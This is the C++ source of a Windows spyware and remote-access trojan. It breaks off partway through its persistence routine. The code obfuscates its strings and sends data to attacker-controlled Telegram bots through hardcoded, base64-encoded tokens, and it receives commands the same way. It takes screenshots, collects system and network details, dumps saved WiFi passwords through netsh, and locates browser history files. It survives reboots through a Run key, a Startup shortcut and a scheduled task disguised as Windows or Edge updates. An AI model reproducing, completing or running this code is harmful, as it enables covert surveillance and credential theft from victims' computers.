#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <wlanapi.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <userenv.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <vector>
#include <map>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <iostream>
#include <filesystem>
#include <random>
#include <regex>
#include <codecvt>
#include <locale>
#include <commdlg.h>
#include <gdiplus.h>
#include <winhttp.h>
#include <winreg.h>
#include <wincrypt.h>
#include <nb30.h>
#include <atomic>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "netapi32.lib")

namespace fs = std::filesystem;

#pragma optimize("", off)
#pragma check_stack(off)

class StringEncryptor {
private:
    static constexpr char XOR_KEY1 = 0x7F;
    static constexpr char XOR_KEY2 = 0x3A;
    static constexpr char XOR_KEY3 = 0x5C;
    
    static char getKeyForIndex(size_t index) {
        switch (index % 3) {
            case 0: return XOR_KEY1;
            case 1: return XOR_KEY2;
            default: return XOR_KEY3;
        }
    }
    
public:
    static std::string decrypt(const std::vector<char>& encrypted) {
        std::string result;
        result.reserve(encrypted.size());
        for (size_t i = 0; i < encrypted.size(); i++) {
            result += encrypted[i] ^ getKeyForIndex(i);
        }
        return result;
    }
    
    static std::vector<char> encrypt(const std::string& str) {
        std::vector<char> result;
        result.reserve(str.length());
        for (size_t i = 0; i < str.length(); i++) {
            result.push_back(str[i] ^ getKeyForIndex(i));
        }
        return result;
    }
};

#define OBFUSCATE(str) \
    []() -> std::string { \
        static const std::vector<char> encrypted = StringEncryptor::encrypt(str); \
        static std::string decrypted; \
        static bool initialized = false; \
        if (!initialized) { \
            decrypted = StringEncryptor::decrypt(encrypted); \
            initialized = true; \
        } \
        return decrypted; \
    }()

void junk_code_sequence() {
    volatile int x = 0;
    volatile int y = 0;
    volatile int z = 0;
    
    for (int i = 0; i < 50; i++) {
        x += i * 13;
        y = (x ^ y) + i;
        z = (y << 2) | (x >> 2);
        x = x ^ z;
        y = y & 0x5A5A5A5A;
        z = z | 0xA5A5A5A5;
    }
}

class UserAgentManager {
private:
    std::vector<std::string> user_agents;
    int current_index;
    
public:
    UserAgentManager() : current_index(0) {
        user_agents = {
            OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
            OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"),
            OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"),
            OBFUSCATE("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0")
        };
    }
    
    std::string getRandomUserAgent() {
        int index = rand() % user_agents.size();
        return user_agents[index];
    }
};

class Base64Decoder {
public:
    static std::string decode(const std::string& input) {
        std::string decoded;
        DWORD size = 0;
        
        CryptStringToBinaryA(input.c_str(), static_cast<DWORD>(input.length()), 
            CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr);
        
        std::vector<BYTE> buffer(size);
        CryptStringToBinaryA(input.c_str(), static_cast<DWORD>(input.length()),
            CRYPT_STRING_BASE64, buffer.data(), &size, nullptr, nullptr);
        
        return std::string(buffer.begin(), buffer.end());
    }
    
    static std::string encode(const std::vector<BYTE>& data) {
        DWORD size = 0;
        CryptBinaryToStringA(data.data(), static_cast<DWORD>(data.size()), 
            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &size);
        
        std::string result(size, 0);
        CryptBinaryToStringA(data.data(), static_cast<DWORD>(data.size()),
            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
            (LPSTR)result.data(), &size);
        
        return result;
    }
};

class TelegramBotManager {
private:
    std::vector<std::string> bot_tokens;
    int current_bot_index;
    std::string api_url;
    UserAgentManager ua_manager;
    
    const std::string BOT1_TOKEN;
    const std::string BOT2_TOKEN;
    
    std::string http_post(const std::string& url, const std::string& data) {
        std::string ua = ua_manager.getRandomUserAgent();
        std::string response;
        
        for (int retry = 0; retry < 3; retry++) {
            HINTERNET hInternet = InternetOpenA(ua.c_str(), 
                INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
            if (!hInternet) {
                Sleep(1000);
                continue;
            }
            
            HINTERNET hConnect = InternetConnectA(hInternet, 
                "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 
                NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
            
            if (!hConnect) {
                InternetCloseHandle(hInternet);
                Sleep(1000);
                continue;
            }
            
            std::string url_path = url.substr(url.find("bot"));
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", 
                url_path.c_str(), 
                "HTTP/1.1", NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
            
            if (!hRequest) {
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                Sleep(1000);
                continue;
            }
            
            std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
            headers += "Cache-Control: no-cache\r\n";
            headers += "Connection: close\r\n";
            
            if (HttpSendRequestA(hRequest, headers.c_str(), static_cast<DWORD>(headers.length()),
                (LPVOID)data.c_str(), static_cast<DWORD>(data.length()))) {
                
                char buffer[8192];
                DWORD bytes_read;
                
                while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytes_read) && 
                       bytes_read > 0) {
                    response.append(buffer, bytes_read);
                }
                
                InternetCloseHandle(hRequest);
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                
                if (!response.empty()) {
                    break;
                }
            } else {
                InternetCloseHandle(hRequest);
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                Sleep(1000);
            }
        }
        
        return response;
    }
    
    std::string http_post_multipart(const std::string& url, const std::string& data, 
                                     const std::string& boundary) {
        std::string ua = ua_manager.getRandomUserAgent();
        std::string response;
        
        for (int retry = 0; retry < 3; retry++) {
            HINTERNET hInternet = InternetOpenA(ua.c_str(), 
                INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
            if (!hInternet) {
                Sleep(1000);
                continue;
            }
            
            HINTERNET hConnect = InternetConnectA(hInternet, 
                "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 
                NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
            
            if (!hConnect) {
                InternetCloseHandle(hInternet);
                Sleep(1000);
                continue;
            }
            
            std::string url_path = url.substr(url.find("bot"));
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", 
                url_path.c_str(), 
                "HTTP/1.1", NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
            
            if (!hRequest) {
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                Sleep(1000);
                continue;
            }
            
            std::string headers = "Content-Type: multipart/form-data; boundary=" + 
                boundary + "\r\n";
            headers += "Cache-Control: no-cache\r\n";
            headers += "Connection: close\r\n";
            
            if (HttpSendRequestA(hRequest, headers.c_str(), static_cast<DWORD>(headers.length()),
                (LPVOID)data.c_str(), static_cast<DWORD>(data.length()))) {
                
                char buffer[8192];
                DWORD bytes_read;
                
                while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytes_read) && 
                       bytes_read > 0) {
                    response.append(buffer, bytes_read);
                }
                
                InternetCloseHandle(hRequest);
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                
                if (!response.empty()) {
                    break;
                }
            } else {
                InternetCloseHandle(hRequest);
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                Sleep(1000);
            }
        }
        
        return response;
    }
    
    std::string url_encode(const std::string& str) {
        std::string encoded;
        char hex[] = "0123456789ABCDEF";
        
        for (unsigned char c : str) {
            if (isalnum(c) || c == '-' || c == '_' || 
                c == '.' || c == '~') {
                encoded += c;
            } else {
                encoded += '%';
                encoded += hex[c >> 4];
                encoded += hex[c & 0xF];
            }
        }
        return encoded;
    }
    
    std::string random_string(int length) {
        static const char chars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        std::string result;
        result.reserve(length);
        for (int i = 0; i < length; i++) {
            result += chars[rand() % (sizeof(chars) - 1)];
        }
        return result;
    }
    
public:
    TelegramBotManager() : current_bot_index(0), 
        api_url(OBFUSCATE("https://api.telegram.org/bot")),
        BOT1_TOKEN(Base64Decoder::decode(OBFUSCATE("ODU5MDI1ODIwNjpBQUh3bVpMNnA3YUVvR0dQejAzVk5fMl9LNnFGYnFLTGUyUQ=="))),
        BOT2_TOKEN(Base64Decoder::decode(OBFUSCATE("ODI0MjY1NzA1MjpBQUVZdlZiYWVRUUdXUmtrRXdhd1h2Zkk1MDQ2NGVINUZSVQ=="))) {
        bot_tokens.push_back(BOT1_TOKEN);
        bot_tokens.push_back(BOT2_TOKEN);
    }
    
    bool sendMessage(const std::string& chat_id, const std::string& message) {
        std::string url = api_url + bot_tokens[current_bot_index] + 
            OBFUSCATE("/sendMessage");
        std::string post_data = OBFUSCATE("chat_id=") + chat_id + 
            OBFUSCATE("&text=") + url_encode(message) + 
            OBFUSCATE("&parse_mode=Markdown");
        
        std::string response = http_post(url, post_data);
        
        if (response.find(OBFUSCATE("\"ok\":true")) != std::string::npos) {
            return true;
        }
        
        // Try fallback bot
        int original_index = current_bot_index;
        current_bot_index = (current_bot_index + 1) % bot_tokens.size();
        
        if (current_bot_index != original_index) {
            url = api_url + bot_tokens[current_bot_index] + 
                OBFUSCATE("/sendMessage");
            response = http_post(url, post_data);
            
            if (response.find(OBFUSCATE("\"ok\":true")) != std::string::npos) {
                return true;
            }
        }
        
        return false;
    }
    
    bool sendPhoto(const std::string& chat_id, const std::vector<BYTE>& photo_data, 
                   const std::string& caption = "") {
        std::string url = api_url + bot_tokens[current_bot_index] + 
            OBFUSCATE("/sendPhoto");
        
        std::string boundary = OBFUSCATE("----WebKitFormBoundary") + random_string(16);
        std::string body;
        
        body += OBFUSCATE("--") + boundary + OBFUSCATE("\r\n");
        body += OBFUSCATE("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
        body += chat_id + OBFUSCATE("\r\n");
        
        if (!caption.empty()) {
            body += OBFUSCATE("--") + boundary + OBFUSCATE("\r\n");
            body += OBFUSCATE("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
            body += caption + OBFUSCATE("\r\n");
        }
        
        body += OBFUSCATE("--") + boundary + OBFUSCATE("\r\n");
        body += OBFUSCATE("Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.jpg\"\r\n");
        body += OBFUSCATE("Content-Type: image/jpeg\r\n\r\n");
        
        std::string full_body = body + std::string(photo_data.begin(), photo_data.end()) + 
            OBFUSCATE("\r\n--") + boundary + OBFUSCATE("--\r\n");
        
        std::string response = http_post_multipart(url, full_body, boundary);
        
        if (response.find(OBFUSCATE("\"ok\":true")) != std::string::npos) {
            return true;
        }
        
        int original_index = current_bot_index;
        current_bot_index = (current_bot_index + 1) % bot_tokens.size();
        
        if (current_bot_index != original_index) {
            url = api_url + bot_tokens[current_bot_index] + 
                OBFUSCATE("/sendPhoto");
            response = http_post_multipart(url, full_body, boundary);
            
            if (response.find(OBFUSCATE("\"ok\":true")) != std::string::npos) {
                return true;
            }
        }
        
        return false;
    }
    
    bool sendFile(const std::string& chat_id, const std::vector<BYTE>& file_data, 
                  const std::string& filename, const std::string& caption = "") {
        std::string url = api_url + bot_tokens[current_bot_index] + 
            OBFUSCATE("/sendDocument");
        
        std::string boundary = OBFUSCATE("----WebKitFormBoundary") + random_string(16);
        std::string body;
        
        body += OBFUSCATE("--") + boundary + OBFUSCATE("\r\n");
        body += OBFUSCATE("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
        body += chat_id + OBFUSCATE("\r\n");
        
        if (!caption.empty()) {
            body += OBFUSCATE("--") + boundary + OBFUSCATE("\r\n");
            body += OBFUSCATE("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
            body += caption + OBFUSCATE("\r\n");
        }
        
        body += OBFUSCATE("--") + boundary + OBFUSCATE("\r\n");
        body += OBFUSCATE("Content-Disposition: form-data; name=\"document\"; filename=\"") + 
            filename + OBFUSCATE("\"\r\n");
        body += OBFUSCATE("Content-Type: application/octet-stream\r\n\r\n");
        
        std::string full_body = body + std::string(file_data.begin(), file_data.end()) + 
            OBFUSCATE("\r\n--") + boundary + OBFUSCATE("--\r\n");
        
        std::string response = http_post_multipart(url, full_body, boundary);
        
        if (response.find(OBFUSCATE("\"ok\":true")) != std::string::npos) {
            return true;
        }
        
        int original_index = current_bot_index;
        current_bot_index = (current_bot_index + 1) % bot_tokens.size();
        
        if (current_bot_index != original_index) {
            url = api_url + bot_tokens[current_bot_index] + 
                OBFUSCATE("/sendDocument");
            response = http_post_multipart(url, full_body, boundary);
            
            if (response.find(OBFUSCATE("\"ok\":true")) != std::string::npos) {
                return true;
            }
        }
        
        return false;
    }
    
    std::pair<std::vector<int>, std::vector<std::string>> getUpdates() {
        std::string url = api_url + bot_tokens[current_bot_index] + 
            OBFUSCATE("/getUpdates?timeout=30&allowed_updates=[\"message\"]");
        
        std::string ua = ua_manager.getRandomUserAgent();
        std::vector<int> update_ids;
        std::vector<std::string> messages;
        
        HINTERNET hInternet = InternetOpenA(ua.c_str(), 
            INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        
        if (!hInternet) return {update_ids, messages};
        
        HINTERNET hConnect = InternetConnectA(hInternet, 
            "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 
            NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return {update_ids, messages};
        }
        
        std::string url_path = url.substr(url.find("bot"));
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", 
            url_path.c_str(), 
            "HTTP/1.1", NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
        
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return {update_ids, messages};
        }
        
        BOOL sent = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
        
        std::string response;
        if (sent) {
            char buffer[16384];
            DWORD bytes_read;
            while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytes_read) && 
                   bytes_read > 0) {
                response.append(buffer, bytes_read);
            }
        }
        
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        
        // Parse response for update_ids and messages
        size_t pos = 0;
        std::string result_key = OBFUSCATE("\"result\"");
        size_t result_pos = response.find(result_key);
        if (result_pos != std::string::npos) {
            size_t array_start = response.find('[', result_pos);
            size_t array_end = response.find(']', array_start);
            
            if (array_start != std::string::npos && array_end != std::string::npos) {
                std::string updates = response.substr(array_start, array_end - array_start + 1);
                
                size_t update_pos = 0;
                while ((update_pos = updates.find(OBFUSCATE("\"update_id\":"), update_pos)) != std::string::npos) {
                    size_t id_start = updates.find(':', update_pos) + 1;
                    size_t id_end = updates.find(',', id_start);
                    if (id_end == std::string::npos) id_end = updates.find('}', id_start);
                    
                    int update_id = std::stoi(updates.substr(id_start, id_end - id_start));
                    update_ids.push_back(update_id);
                    
                    // Extract message text
                    size_t text_pos = updates.find(OBFUSCATE("\"text\":\""), id_end);
                    if (text_pos != std::string::npos) {
                        text_pos += 8;
                        size_t text_end = updates.find('\"', text_pos);
                        if (text_end != std::string::npos) {
                            std::string msg = updates.substr(text_pos, text_end - text_pos);
                            // Unescape JSON string
                            std::string unescaped;
                            for (size_t i = 0; i < msg.length(); i++) {
                                if (msg[i] == '\\' && i + 1 < msg.length()) {
                                    if (msg[i + 1] == 'n') unescaped += '\n';
                                    else if (msg[i + 1] == 't') unescaped += '\t';
                                    else if (msg[i + 1] == '\\') unescaped += '\\';
                                    else if (msg[i + 1] == '\"') unescaped += '\"';
                                    else unescaped += msg[i + 1];
                                    i++;
                                } else {
                                    unescaped += msg[i];
                                }
                            }
                            messages.push_back(unescaped);
                        } else {
                            messages.push_back("");
                        }
                    } else {
                        messages.push_back("");
                    }
                    
                    update_pos = id_end;
                }
            }
        }
        
        return {update_ids, messages};
    }
};

class ScreenshotCapture {
public:
    static std::vector<BYTE> captureToMemory() {
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
        SelectObject(hdcMem, hBitmap);
        
        BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
        
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = width;
        bmi.bmiHeader.biHeight = -height;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 24;
        bmi.bmiHeader.biCompression = BI_RGB;
        
        std::vector<BYTE> pixels(width * height * 3);
        GetDIBits(hdcMem, hBitmap, 0, height, pixels.data(), &bmi, DIB_RGB_COLORS);
        
        std::vector<BYTE> jpeg_data = convertToJPEG(pixels, width, height);
        
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        
        return jpeg_data;
    }
    
private:
    static std::vector<BYTE> convertToJPEG(const std::vector<BYTE>& bitmap, int width, int height) {
        Gdiplus::GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
        
        std::vector<BYTE> jpeg_data;
        
        Gdiplus::Bitmap bmp(width, height, width * 3, PixelFormat24bppRGB, (BYTE*)bitmap.data());
        
        IStream* pStream = NULL;
        CreateStreamOnHGlobal(NULL, TRUE, &pStream);
        
        CLSID jpegClsid;
        GetEncoderClsid(L"image/jpeg", &jpegClsid);
        
        bmp.Save(pStream, &jpegClsid, NULL);
        
        STATSTG statstg;
        pStream->Stat(&statstg, STATFLAG_NONAME);
        
        ULONG size = statstg.cbSize.LowPart;
        jpeg_data.resize(size);
        
        LARGE_INTEGER li = {0};
        pStream->Seek(li, STREAM_SEEK_SET, NULL);
        pStream->Read(jpeg_data.data(), size, NULL);
        
        pStream->Release();
        Gdiplus::GdiplusShutdown(gdiplusToken);
        
        return jpeg_data;
    }
    
    static void GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
        UINT num = 0;
        UINT size = 0;
        
        Gdiplus::GetImageEncodersSize(&num, &size);
        if (size == 0) return;
        
        Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
        Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
        
        for (UINT j = 0; j < num; ++j) {
            if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
                *pClsid = pImageCodecInfo[j].Clsid;
                break;
            }
        }
        
        free(pImageCodecInfo);
    }
};

class SystemInfo {
public:
    static std::string getHostname() {
        char buffer[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(buffer);
        GetComputerNameA(buffer, &size);
        return std::string(buffer);
    }
    
    static std::string getUsername() {
        char buffer[UNLEN + 1];
        DWORD size = sizeof(buffer);
        GetUserNameA(buffer, &size);
        return std::string(buffer);
    }
    
    static std::string getOSVersion() {
        OSVERSIONINFOEXA osvi = {0};
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
        GetVersionExA((LPOSVERSIONINFOA)&osvi);
        
        std::stringstream ss;
        ss << OBFUSCATE("Windows ") << osvi.dwMajorVersion << OBFUSCATE(".") << osvi.dwMinorVersion;
        ss << OBFUSCATE(" Build ") << osvi.dwBuildNumber;
        return ss.str();
    }
    
    static std::string getCPUInfo() {
        HKEY hKey;
        char cpu[256] = {0};
        DWORD size = sizeof(cpu);
        
        std::string keyPath = OBFUSCATE("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            keyPath.c_str(),
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            std::string valueName = OBFUSCATE("ProcessorNameString");
            RegQueryValueExA(hKey, valueName.c_str(), NULL, NULL, 
                (LPBYTE)cpu, &size);
            RegCloseKey(hKey);
        }
        return std::string(cpu);
    }
    
    static std::string getMemoryInfo() {
        MEMORYSTATUSEX ms = {0};
        ms.dwLength = sizeof(ms);
        GlobalMemoryStatusEx(&ms);
        
        std::stringstream ss;
        ss << OBFUSCATE("Total: ") << ms.ullTotalPhys / (1024 * 1024) << OBFUSCATE(" MB");
        ss << OBFUSCATE(", Available: ") << ms.ullAvailPhys / (1024 * 1024) << OBFUSCATE(" MB");
        return ss.str();
    }
    
    static std::string getIPAddress() {
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        
        struct hostent* host = gethostbyname(hostname);
        if (host && host->h_addr_list[0]) {
            struct in_addr addr;
            memcpy(&addr, host->h_addr_list[0], host->h_length);
            return inet_ntoa(addr);
        }
        return OBFUSCATE("Unknown");
    }
    
    static std::string getMACAddress() {
        IP_ADAPTER_INFO adapter_info[16];
        DWORD size = sizeof(adapter_info);
        
        if (GetAdaptersInfo(adapter_info, &size) == NO_ERROR) {
            PIP_ADAPTER_INFO adapter = adapter_info;
            while (adapter) {
                if (adapter->AddressLength >= 6) {
                    char mac[18];
                    sprintf_s(mac, sizeof(mac), OBFUSCATE("%02X:%02X:%02X:%02X:%02X:%02X").c_str(),
                        adapter->Address[0], adapter->Address[1], adapter->Address[2],
                        adapter->Address[3], adapter->Address[4], adapter->Address[5]);
                    return std::string(mac);
                }
                adapter = adapter->Next;
            }
        }
        return OBFUSCATE("Unknown");
    }
    
    static std::string getCurrentTime() {
        time_t now = time(0);
        struct tm tstruct;
        char buf[80];
        localtime_s(&tstruct, &now);
        std::string format = OBFUSCATE("%Y-%m-%d %H:%M:%S");
        strftime(buf, sizeof(buf), format.c_str(), &tstruct);
        return buf;
    }
    
    static std::string getAllInfo() {
        std::stringstream ss;
        ss << OBFUSCATE("📱 **System Information**\n\n");
        ss << OBFUSCATE("**Hostname:** ") << getHostname() << OBFUSCATE("\n");
        ss << OBFUSCATE("**Username:** ") << getUsername() << OBFUSCATE("\n");
        ss << OBFUSCATE("**OS:** ") << getOSVersion() << OBFUSCATE("\n");
        ss << OBFUSCATE("**CPU:** ") << getCPUInfo() << OBFUSCATE("\n");
        ss << OBFUSCATE("**Memory:** ") << getMemoryInfo() << OBFUSCATE("\n");
        ss << OBFUSCATE("**IP Address:** ") << getIPAddress() << OBFUSCATE("\n");
        ss << OBFUSCATE("**MAC Address:** ") << getMACAddress() << OBFUSCATE("\n");
        ss << OBFUSCATE("**Current Time:** ") << getCurrentTime() << OBFUSCATE("\n");
        return ss.str();
    }
};

class WiFiPasswordExtractor {
public:
    static std::string extractAll() {
        std::stringstream result;
        result << OBFUSCATE("📶 **WiFi Passwords**\n\n");
        
        std::string cmd = OBFUSCATE("netsh wlan show profiles");
        FILE* pipe = _popen(cmd.c_str(), "r");
        if (!pipe) return OBFUSCATE("Failed to get WiFi profiles");
        
        char buffer[1024];
        std::string output;
        while (fgets(buffer, sizeof(buffer), pipe)) {
            output += buffer;
        }
        _pclose(pipe);
        
        std::regex profile_regex(OBFUSCATE("All User Profile\\s+:\\s+(.+)"));
        std::smatch match;
        std::string::const_iterator search_start(output.cbegin());
        
        int count = 0;
        while (std::regex_search(search_start, output.cend(), match, profile_regex)) {
            std::string ssid = match[1].str();
            std::string cmd2 = OBFUSCATE("netsh wlan show profile name=\"") + ssid + 
                OBFUSCATE("\" key=clear");
            
            pipe = _popen(cmd2.c_str(), "r");
            std::string profile_output;
            while (fgets(buffer, sizeof(buffer), pipe)) {
                profile_output += buffer;
            }
            _pclose(pipe);
            
            std::regex pass_regex(OBFUSCATE("Key Content\\s+:\\s+(.+)"));
            std::smatch pass_match;
            if (std::regex_search(profile_output, pass_match, pass_regex)) {
                result << OBFUSCATE("**") << ssid << OBFUSCATE(":** `") << 
                    pass_match[1].str() << OBFUSCATE("`\n");
                count++;
            } else {
                result << OBFUSCATE("**") << ssid << OBFUSCATE(":** (no password/enterprise)\n");
            }
            
            search_start = match[0].second;
        }
        
        if (count == 0) {
            result << OBFUSCATE("No saved WiFi passwords found.\n");
        }
        
        return result.str();
    }
};

class BrowserHistoryExtractor {
public:
    static std::string extractChrome() {
        std::stringstream result;
        result << OBFUSCATE("🌐 **Chrome History**\n\n");
        
        std::string localAppData = getenv("LOCALAPPDATA");
        if (localAppData.empty()) {
            result << OBFUSCATE("Could not get LOCALAPPDATA path.\n");
            return result.str();
        }
        
        std::string history_path = localAppData;
        history_path += OBFUSCATE("\\Google\\Chrome\\User Data\\Default\\History");
        
        if (!fs::exists(history_path)) {
            result << OBFUSCATE("Chrome history not found.\n");
            return result.str();
        }
        
        result << OBFUSCATE("Chrome history file found at: ") << history_path << OBFUSCATE("\n");
        result << OBFUSCATE("(Full parsing would require SQLite library)\n");
        
        return result.str();
    }
    
    static std::string extractFirefox() {
        std::stringstream result;
        result << OBFUSCATE("🦊 **Firefox History**\n\n");
        
        std::string appdata = getenv("APPDATA");
        if (appdata.empty()) {
            result << OBFUSCATE("Could not get APPDATA path.\n");
            return result.str();
        }
        
        std::string profiles_path = appdata + OBFUSCATE("\\Mozilla\\Firefox\\Profiles");
        
        if (!fs::exists(profiles_path)) {
            result << OBFUSCATE("Firefox history not found.\n");
            return result.str();
        }
        
        for (const auto& entry : fs::directory_iterator(profiles_path)) {
            if (entry.is_directory()) {
                std::string places_path = entry.path().string() + OBFUSCATE("\\places.sqlite");
                if (fs::exists(places_path)) {
                    result << OBFUSCATE("Firefox history file found at: ") << places_path << OBFUSCATE("\n");
                    result << OBFUSCATE("(Full parsing would require SQLite library)\n");
                    break;
                }
            }
        }
        
        return result.str();
    }
    
    static std::string extractEdge() {
        std::stringstream result;
        result << OBFUSCATE("🧭 **Edge History**\n\n");
        
        std::string localAppData = getenv("LOCALAPPDATA");
        if (localAppData.empty()) {
            result << OBFUSCATE("Could not get LOCALAPPDATA path.\n");
            return result.str();
        }
        
        std::string history_path = localAppData;
        history_path += OBFUSCATE("\\Microsoft\\Edge\\User Data\\Default\\History");
        
        if (!fs::exists(history_path)) {
            result << OBFUSCATE("Edge history not found.\n");
            return result.str();
        }
        
        result << OBFUSCATE("Edge history file found at: ") << history_path << OBFUSCATE("\n");
        result << OBFUSCATE("(Full parsing would require SQLite library)\n");
        
        return result.str();
    }
};

class PersistenceEngine {
private:
    std::string current_exe;
    
    std::string getCurrentExe() {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        return std::string(path);
    }
    
    std::string random_hex(int length) {
        static const char hex[] = "0123456789ABCDEF";
        std::string result;
        result.reserve(length);
        for (int i = 0; i < length; i++) {
            result += hex[rand() % 16];
        }
        return result;
    }
    
public:
    PersistenceEngine() {
        current_exe = getCurrentExe();
    }
    
    bool installRegistryRun() {
        HKEY hKey;
        std::string key_name = OBFUSCATE("WindowsUpdate_") + 
            std::to_string(GetCurrentProcessId());
        
        std::string regPath = OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
        if (RegOpenKeyExA(HKEY_CURRENT_USER, 
            regPath.c_str(),
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            
            RegSetValueExA(hKey, key_name.c_str(), 0, REG_SZ, 
                (const BYTE*)current_exe.c_str(), static_cast<DWORD>(current_exe.length() + 1));
            RegCloseKey(hKey);
            return true;
        }
        return false;
    }
    
    bool installStartupFolder() {
        char startup_path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
            std::string shortcut_path = std::string(startup_path) + 
                OBFUSCATE("\\SystemUpdate.lnk");
            
            CoInitialize(NULL);
            IShellLinkA* psl;
            if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
                IID_IShellLinkA, (void**)&psl))) {
                
                psl->SetPath(current_exe.c_str());
                std::string desc = OBFUSCATE("System Update");
                psl->SetDescription(desc.c_str());
                
                IPersistFile* ppf;
                if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf))) {
                    std::wstring wpath(shortcut_path.begin(), shortcut_path.end());
                    ppf->Save(wpath.c_str(), TRUE);
                    ppf->Release();
                }
                psl->Release();
            }
            CoUninitialize();
            return true;
        }
        return false;
    }
    
    bool installScheduledTask() {
        std::string task_name = OBFUSCATE("MicrosoftEdgeUpdateTask_") + 
            std::to_string(GetCurrentProcessId());
        std::string cmd = OBFUSCATE("schtasks /create /tn \"") + task_name + 
            OBFUSCATE("\" /tr \"") + current_exe + OBFUSCATE("\" /sc daily /st 09:00 /f");
        system(cmd.c_str());
        return true;
    }
    
    void installAll() {
